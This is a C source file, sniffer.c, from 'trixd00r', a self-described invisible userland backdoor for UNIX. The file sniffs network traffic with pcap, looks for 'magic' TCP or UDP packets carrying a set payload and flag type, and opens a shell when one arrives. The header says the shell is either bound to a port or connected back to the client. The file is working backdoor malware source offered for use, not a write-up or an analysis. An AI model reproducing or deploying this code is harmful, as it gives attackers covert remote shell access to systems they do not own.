/*******************************************************************************
 *                ____                     _ __                                *
 *     ___  __ __/ / /__ ___ ______ ______(_) /___ __                          *
 *    / _ \/ // / / (_-</ -_) __/ // / __/ / __/ // /                          *
 *   /_//_/\_,_/_/_/___/\__/\__/\_,_/_/ /_/\__/\_, /                           *
 *                                            /___/ nullsecurity team          * 
 *                                                                             *
 * trixd00r - Advanced and invisible TCP/IP based userland backdoor            *
 *                                                                             *
 * FILE                                                                        *
 * server/src/sniffer.c                                                        *
 *                                                                             *
 * DATE                                                                        *
 * 02/10/2012                                                                  *
 *                                                                             *
 * DESCRIPTION                                                                 *
 * trixd00r is an advanced and invisible userland backdoor based on TCP/IP for *
 * UNIX systems. It consists of a server and a client. The server sits and     *
 * waits for magic packets using a sniffer. If a magic packet arrives, it will *
 * bind a shell over TCP or UDP on the given port or connecting back to the    *
 * client again over TCP or UDP. The client is used to send magic packets to   *
 * trigger the server and get a shell.                                         *
 *                                                                             *
 * COPYRIGHT                                                                   *
 * Read docs/COPYING.                                                          *
 *                                                                             *
 * AUTHOR                                                                      *
 * noptrix - http://www.nullsecurity.net/                                      *
 *                                                                             *
 ******************************************************************************/

#include "sniffer.h"
#include "controller.h"
#include "trixd00rd.h"
#include "shell.h"
#include "verbose.h"
#include "wrapper.h"


static void is_allowed_host(packet_t *);
static unsigned char is_magic_packet(packet_t *);
static void define_payload(packet_t *, unsigned int);
static unsigned int define_udphdr(packet_t *);
static unsigned int define_tcphdr(packet_t *);
static void define_iphdr(packet_t *);
static void define_packet(packet_t *);
static void got_packet(unsigned char *, const struct pcap_pkthdr *,
                       const unsigned char *);


/* print out supported magic packet types and protocol */
void print_packet_types()
{
    unsigned char i = 0;
    const char *descr[_NUM_PKT_TYPES] = {
        TCP_SYN_TYPE, TCP_ACK_TYPE, TCP_RST_TYPE, TCP_PSH_TYPE, TCP_URG_TYPE,
        TCP_FIN_TYPE, UDP_TYPE
    };

    
    printf("[+] "BLUE"available protocol and packet types"NORM"\n");
    for (i = 0; i < _NUM_PKT_TYPES; i++) {
        printf("--- %u [%s]\n", i, descr[i]);
    }
    
    return;
}


/* is host allowed to connect? (default IS) */
static void is_allowed_host(packet_t *packet)
{
    struct hostent *p = NULL;


    /* if allowed host is DEF_HOST, then we do not need to call gethostbyname()
     * and we use directly the packet's source ip address (any host is allowed
     * to use trixd00rd) */
    if (strncmp(packet->allowed_host, DEF_HOST, strlen(DEF_HOST)) != 0) {
        p = gethostbyname(packet->allowed_host);
        xinet_ntop(AF_INET, p->h_addr_list[0], packet->dst_host,
                   sizeof(packet->src_host));
    } else {
        xinet_ntop(AF_INET, &packet->ip->src.s_addr, packet->dst_host,
                   sizeof(packet->dst_host));
    }
    
    xinet_ntop(AF_INET, &packet->ip->src.s_addr, packet->src_host,
               sizeof(packet->dst_host));

    return;
}


/* is it our magic packet or not? */
static unsigned char is_magic_packet(packet_t *packet)
{
    /* if option was used, check if host is allowed to connect */
    is_allowed_host(packet);
   
    /* if set payload equals sniffed payload, then we got magic packet */ 
    if (strcmp((const char *) packet->src_host, packet->dst_host) == 0) {
        if (strcmp(packet->m_payload, packet->s_payload) == 0) {
            if (packet->ip->ip_p == IPPROTO_TCP) {
                switch (packet->type) {
                 case _TCP_SYN_TYPE:
                     if (packet->tcp->th_flags & TH_SYN) {
                         return IS_MAGIC_PACKET;
                     }
                     break;
                 case _TCP_ACK_TYPE:
                     if (packet->tcp->th_flags & TH_ACK) {
                         return IS_MAGIC_PACKET;
                     }
                     break;
                 case _TCP_RST_TYPE:
                     if (packet->tcp->th_flags & TH_RST) {
                         return IS_MAGIC_PACKET;
                     }
                     break;
                 case _TCP_PSH_TYPE:
                     if (packet->tcp->th_flags & TH_PUSH) {
                         return IS_MAGIC_PACKET;
                     }
                     break;
                 case _TCP_URG_TYPE:
                     if (packet->tcp->th_flags & TH_URG) {
                         return IS_MAGIC_PACKET;
                     }
                     break;
                 case _TCP_FIN_TYPE:
                     if (packet->tcp->th_flags & TH_FIN) {
                         return IS_MAGIC_PACKET;
                     }
                     break;
                }
            } else if (packet->ip->ip_p == IPPROTO_UDP) {
                switch (packet->type) {
                 case _UDP_TYPE:
                     return IS_MAGIC_PACKET;
                     break;
                }
            }
        } else if (strcmp(packet->b_payload, packet->s_payload) == 0) {
            return IS_BYEBYE_PACKET;
        }
    }

    return IS_NOT_MAGIC_PACKET;
}


/* define payload */
static void define_payload(packet_t *packet, unsigned int size)
{
    packet->s_payload = (char *) (packet->bytes + SIZE_ETHERNET +
                                  packet->size_ip + size);

    return;
}


/* define udp header and size */
static unsigned int define_udphdr(packet_t *packet)
{
    packet->udp = (udp_t *) (packet->bytes + SIZE_ETHERNET + packet->size_ip);
    packet->size_udp = 8;

    return packet->size_udp;
}


/* define tcp header and size */
static unsigned int define_tcphdr(packet_t *packet)
{
    packet->tcp = (tcp_t *) (packet->bytes + SIZE_ETHERNET + packet->size_ip);
    packet->size_tcp = TH_OFF(packet->tcp) * 4;

    return packet->size_tcp;
}


/* define ip header and size */
static void define_iphdr(packet_t *packet)
{
    packet->ip = (ip_t *) (packet->bytes + SIZE_ETHERNET);
    packet->size_ip = IP_HL(packet->ip) * 4;
    
    return;
}


/* detemerine and define protocols (headers and size) */
static void define_packet(packet_t *packet)
{
    int size = 0;   /* header size */


    /* we need always ip header */
    define_iphdr(packet);

    /* determine protocol */
    switch (packet->ip->ip_p) {
     case IPPROTO_TCP:
         size = define_tcphdr(packet);
         break;
     case IPPROTO_UDP:
         size = define_udphdr(packet);
         break;
     case IPPROTO_ICMP:
         /* todo */
         break;
    }

    /* we need always payload */
    define_payload(packet, size);

    return;
}


/* define any headers, test for magic packet and open shell or break the loop */
static void got_packet(unsigned char *args, const struct pcap_pkthdr *header,
                       const unsigned char *bytes)
{
    unsigned char magic = 0;
    ctrl_t *ctrl = (ctrl_t *) args;
    sniffer_t *sniffer = (sniffer_t *) ctrl->sniffer;
    packet_t *packet = (packet_t *) ctrl->packet;

    
    /* ignore this */
    header = NULL;
    packet->bytes = bytes;

    /* define packet and check for magic packet */
    define_packet(packet);
    magic = is_magic_packet(packet);

    /* either shell or bye bye */
    if (magic == IS_MAGIC_PACKET) {
        __VERBOSE_MAGIC;
        open_shell(ctrl);
    } else if (magic == IS_BYEBYE_PACKET) {
        __VERBOSE_BYEBYE;
        pcap_breakloop(sniffer->handle);
    }

    return;
}


/* sniff magic packet */
unsigned char watch_packet(ctrl_t *ctrl)
{
    unsigned char *args = (unsigned char *) ctrl;
    sniffer_t *sniffer = (sniffer_t *) ctrl->sniffer;


    /* watch packet and take desired actions as long as we don't hit
     * pcap_breakloop() - this indicates, that we got a IS_BYEBYE_PACKET, so we
     * have to clean, free any memory and exit */
    if (pcap_loop(sniffer->handle, -1, got_packet, args) == -2) {
        return IS_BYEBYE_PACKET;
    }

    return IS_NOT_MAGIC_PACKET;
}


/* prepare sniffer, all needed by pcap */
void prepare_sniffer(ctrl_t *ctrl)
{
    sniffer_t *sniffer = (sniffer_t *) ctrl->sniffer;


    xpcap_lookupnet(sniffer->iface, &sniffer->net, &sniffer->mask);
    sniffer->handle = xpcap_open_live(sniffer->iface, BUFSIZ, 0, 1000);

    return;
}

/* EOF */
